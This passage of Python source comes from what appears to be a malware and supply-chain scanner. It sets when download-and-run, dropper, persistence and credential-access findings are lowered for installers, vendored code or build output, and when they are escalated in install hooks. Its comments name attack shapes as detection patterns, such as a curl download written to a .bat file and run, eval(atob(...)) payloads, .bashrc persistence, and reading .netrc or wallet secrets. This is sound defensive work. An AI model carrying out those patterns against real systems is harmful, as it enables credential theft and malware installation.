                # a WSL or container agent -- from code the editor runs: Codespaces, APKLab and
                # DOSBox do it in their main bundle. Reported, below the gate. A download written
                # to an executable and started, as one construct, is not lowered: that is the
                # shape the malicious extensions use, `.bat` droppers included.
                ceilinged = "an editor extension fetching and starting its own tools"
                ceiling = Severity.MEDIUM
            elif compiled.rule.id == self.DROPPER_RULE and no_download_runs:
                # An agent's tool that never runs what it fetched (`detect/download_flow.py`):
                # reported, below the gate. Running, evaluating or making executable anything
                # downloaded is not lowered.
                ceilinged = "an agent's tool that never runs what it downloads"
                ceiling = Severity.MEDIUM
            elif (
                compiled.rule.id == self.REMOTE_CODE_RULE
                and content.path in ctx.import_entry_paths
                and content.path not in ctx.library_entry_paths | ctx.library_closure_paths
                and not in_hook
            ):
                # A command a person runs (`bin`), not code an install or an import runs: a CLI
                # fetching and starting its own release. npm work half: 20 legitimate, 5 malware
                # -- all 5 blocked by other rules. Reported, below the gate.
                ceilinged = "a command a person runs, never run on install or import"
                ceiling = Severity.MEDIUM
            elif content.path.rpartition("!")[2].endswith(".map"):
                # A source map carries the original sources as JSON strings for a debugger to
                # show. Nothing loads it as code, so even a download-and-run construct in it is
                # text -- the bundle it maps is scanned on its own.
                ceilinged = "a source map, which is never run"
            elif (
                SourcePaths.is_generated_artefact(content.path)
                and not CapabilityDetector._flow_in_shipped_code(compiled.rule.id, content, ctx)
                and not LoadPath.runs_a_downloaded_file(hits)
                and not CapabilityDetector._evaluates_a_literal_payload(content)
                and not CapabilityDetector._turns_an_agent_on_the_user(hits)
                and not CapabilityDetector._sends_a_wallet_secret(hits)
            ):
                # Not when the output downloads and runs in one construct. A bundle holds a
                # module loader's decoder and evaluator by construction, which is what this
                # ceiling is for; it holds `curl ... -o x.bat && x.bat` only if somebody put it
                # there, and an editor extension ships nothing but its bundle.
                ceilinged = "generated build output"
            elif SourcePaths.is_vendored(content.path):
                # Somebody else's code, committed. `jart/cosmopolitan` vendors CPython's
                # standard library at `third_party/python/Lib/`, and five of its findings
                # were the import machinery doing what the import machinery does --
                # `_bootstrap_external.py` decodes a pyc and executes it, `nntplib.py`
                # reads `.netrc`, `distutils/command/register.py` reads `.pypirc`.
                #
                # The secrets detector has ceilinged on this since it measured it; this
                # one was comparing every other kind of path and not that one. What it
                # says is that a capability in vendored code belongs to whoever wrote
                # the library, which is a different review from the one this report is.
                ceilinged = "vendored third-party code"
            elif (
                BuildOutput.is_minified(content)
                and not CapabilityDetector._flow_in_shipped_code(compiled.rule.id, content, ctx)
                and not LoadPath.runs_a_downloaded_file(hits)
                and not CapabilityDetector._evaluates_a_literal_payload(content)
                and not CapabilityDetector._turns_an_agent_on_the_user(hits)
                and not CapabilityDetector._sends_a_wallet_secret(hits)
            ):
                # The same exceptions as generated output, for the same reasons. The second
                # matters most here: a long encoded payload is itself what makes a hand-written
                # file look minified (`eval(atob('...'))` in `tailwind-animation-effect`).
                ceilinged = "minified output"
            elif PublishReach.unreached(compiled.rule.id, content.path, ctx):
                ceilinged, ceiling = PublishReach.REASON, Severity.MEDIUM
            elif verified and compiled.rule.id in (self.DROPPER_RULE, self.REMOTE_CODE_RULE):
                ceilinged = CapabilityDetector.VERIFIED_DOWNLOAD_REASON
                ceiling = Severity.MEDIUM
            elif (
                compiled.rule.id in self.ON_REQUEST_RULES
                and not in_hook
                and not ctx.in_ci_hook(content.path)
                # A shell script that decodes on the way to running is the encoded-dropper shape
                # and is never lowered. In Python or JavaScript the decode is one of the hits
                # being placed, and it is lowered only if it too sits in a body nothing on the
                # load path reaches -- decoding a GitHub API response in a method is not that.
                and not (
                    Capability.DECODE in present
                    and unit.language in LoadPath.SCRIPT_LANGUAGES_RUN_BY_HAND
                )
                # A command channel -- what arrives on a connection, run -- is not a routine a
                # caller asks for; it is never lowered for running only when called.
                and not any(
                    hit.rule_id in ("CAP.GO.RECEIVED_RUN", "CAP.JS.RECEIVED_RUN") for hit in hits
                )
            ):
                # Fetch-and-run is HIGH where it runs on its own: an install hook, a pipeline, a
                # `.pth`, a library's top level that executes on import. An `install.sh` or a
                # `script/linux` runs when a person chooses to run it, and a CLI's
                # download-the-browser routine runs when its function is called -- across 333
                # of the most-starred repositories that was 56 blocking findings in 39 of them,
                # every one an installer doing what installers do. The build-file rules
                # (Makefile, Dockerfile, MSBuild, Ansible) keep their own verdict for builds
                # that run unattended; a decoded payload is never excused.
                deferred = LoadPath.run_on_request(content, unit.language, hits, matched, ctx)
                if (
                    deferred
                    and compiled.rule.id != self.DROPPER_RULE
                    and SourcePaths.is_editor_extension(content.path)
                ):
                    # An extension's `activate` is called by the editor, so "runs only when called"
                    # does not hold: a beacon there reports the machine on every start. Only the weak
                    # dropper combination -- spawn, decode and a request, which remote-development
                    # tools do all day -- keeps the lowering (`_run_on_request`).
                    deferred = ""
                if (
                    deferred == LoadPath.ON_REQUEST_REASONS[0]
                    and compiled.rule.id == "SUSPECT.PERSIST.001"
                ):
                    # A script that writes what it downloads into `~/.bashrc` or a service unit
                    # keeps running after whoever ran it has gone. Running it by hand is a moment;
                    # what it persists is not.
                    deferred = ""
                if deferred:
                    ceilinged = deferred
                    ceiling = Severity.MEDIUM
                elif compiled.rule.id == self.DROPPER_RULE and self._official_installs_only(
                    content, hits
                ):
                    ceilinged = "the tool's own official installer"
                    ceiling = Severity.MEDIUM
        if ceilinged:
            severity = min(severity, ceiling)
            escalations.append(
                f"reported below its usual severity because it sits in {ceilinged}"
                + (
                    ""
                    if ceilinged in LoadPath.ON_REQUEST_REASONS
                    or ceilinged in ("the tool's own official installer", PublishReach.REASON)
                    or ceilinged == CapabilityDetector.VERIFIED_DOWNLOAD_REASON
                    else ", where a pattern like this is usually written to be read rather than run"
                )
            )

        if in_hook and not agent_tool_client:
            # This is the escalation that matters most in the whole engine. The
            # identical capability pair is ordinary in application code and is a
            # credential harvester in an install hook, because install-time code
            # runs unprompted, as the developer, with the developer's full
            # environment, before any test, review, container boundary or network
            # policy applies.
            escalations.append(
                "runs during install or build, as the user, before any other control"
            )
            severity = Severity.CRITICAL
            if (
                category is Category.SUSPICIOUS
                and {
                    Capability.CREDENTIAL,
                    Capability.EGRESS,
                }
                <= present
            ):
                category = Category.MALICIOUS
                escalations.append("reads credentials and reaches the network from an install hook")

        is_obfuscated = Capability.DECODE in present

        risk = ctx.scorer.score(
            severity,
            rule.confidence,
            ScoringContext(
                in_install_hook=in_hook,
                capabilities=frozenset(present),
                is_obfuscated=is_obfuscated,
            ),
        )

        contributing = tuple(
            f"{h.rule_id}@{h.line}"
            for h in sorted(hits, key=lambda h: h.byte_start)
            if h.capability in matched
        )

        return Finding(
            rule_id=rule.id,
            category=category,
            severity=severity,
            confidence=rule.confidence,
            message=rule.message,
            location=Location(
                path=content.path,
                line=anchor.line,
                column=content.column_of(anchor.byte_start),
                byte_start=anchor.byte_start,
                byte_end=anchor.byte_end,
                project=unit.project,
            ),
            evidence=evidence,
            remediation=rule.remediation,
            explanation=Explanation(
                summary=rule.title,
                matched_rule=rule.id,
                contributing=contributing,
                escalations=tuple(escalations),
            ),
            risk=risk,
            detector=self.id,
            rule_version=rule.version,
            rulepack=rule.rulepack,
            references=rule.references,
            capabilities=tuple(sorted(matched, key=lambda c: c.value)),
        )


__all__ = ["CapabilityDetector"]
